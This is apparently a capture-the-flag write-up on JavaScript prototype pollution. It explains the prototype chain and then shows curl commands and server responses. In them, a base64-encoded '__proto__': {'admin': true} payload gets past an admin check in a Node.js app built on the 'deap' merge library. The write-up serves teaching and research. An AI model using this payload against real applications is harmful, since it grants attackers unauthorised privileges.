# JS Prototype Injection

To understand this vulnerability you must first read about the prototypical inheritance in JS [1].
To introduce this concept shortly, a prototype is a living (in the runtime) object, that our object is linked to (object.\_\_proto\_\_ attribute).
This attributes form a chain, as the prototypes have their own prototypes. This is called the prototype chain.

One thing to note is that, if you want to use a property of the object (let's say obj.a) then if 'a' is not defined directly
in the object, then the runtime will search the prototype chain and return the value from the first prototype, that has this property defined.

```js
var o = {}
o.a = "I'm here"

var t = Object.create(o)
t.a
-> "I'm here"
```

And having this in mind, we can do something like this

```js
var o = {}
var t = Object.create(o)
t.__proto__.a = "I'm here"
t.a
-> "I'm here"
o.a
-> "I'm here"
```

Moving to JS prototype poisoning, the vulnerability appeared on Port Swiggers list of top web hacks in 2018 [2].
It was discovered and then researched by Olivier Arteau [3]. Go on and read the paper for better description.
TL;DR we want to inject data into the prototype of the object, and from there we can achieve a lot of different things.
Worth to note, this mainly affects Node.js appliactions.

In this challenge we are given a website ("Forbidden snack") that asks us for our name and if we want to buy a flag.
Intercepting requests in the browser, we can observe one that's interesting:

```
> GET /flag/eyJ1c2VybmFtZSI6ImxvbDIifQ== HTTP/1.1
> Host: 106.120.184.13:3000
> User-Agent: curl/7.64.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 13
< ETag: W/"d-4N0Yh1uaE1dveMsz+j0BbASjbbo"
< Date: Wed, 22 May 2019 13:46:12 GMT
< Connection: keep-alive
< 
* Connection #0 to host 106.120.184.13 left intact
{"flag":"no"}
```

Observations:
* X-Powered-By: Express - appliaction is probably running on node.js (maybe it is vulnerable to js prototype poisoning?)
* GET /flag/eyJ1c2VybmFtZSI6ImxvbDIifQ== - this is base64 encoding of ```{"username":"lol2"}```

Also, the front end of the appliaction requires us to be an admin in order to get the flag.
Now, using this knowledge and curl we can query the app for flag:

```
$ curl -i http://localhost:3000/flag/$(echo -n '{"username":"lol2"}' | base64)
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 13
ETag: W/"d-4N0Yh1uaE1dveMsz+j0BbASjbbo"
Date: Wed, 22 May 2019 13:53:09 GMT
Connection: keep-alive

{"flag":"no"}
```

Now, what happens if we try to make ourself an admin:
```
$ curl -i http://localhost:3000/flag/$(echo -n '{"username":"lol2", "admin": true}' | base64)
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 17
ETag: W/"11-VTnVyZZ+o9b9kTysxmR3eGHBEC4"
Date: Wed, 22 May 2019 13:54:02 GMT
Connection: keep-alive

{"flag":"hacker"}
```

There is a check on the backend of the application, if we are supplying admin in the request.
So let's try and poison the prototype of the object, in order to make the resulting object 
have a declared property named admin.

```
curl -i http://localhost:3000/flag/$(echo -n '{"username":"lol2", "__proto__": {"admin": true}}' | base64)
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 21
ETag: W/"15-m+EOYnWFvqe8cHHLz9ndbEsyTQY"
Date: Wed, 22 May 2019 13:55:40 GMT
Connection: keep-alive

{"flag":"thisisflag"}
```

Our attack worked.

This is possible due to the fact, that backend uses vulnerable library named "deap" to make a copy of the object send by the user.

```js
function checkIfAdmin(user) {
    let userParsed = deap.merge({}, user)
    ...
```

Thats all folks.


References:
1. Inheritance and the prototype chain, MDN https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain
2. James Kettle, Top 10 web hacking techniques of 2018, https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018
3. Olivier Arteau, Prototype pollution attack, https://github.com/HoLyVieR/prototype-pollution-nsec18

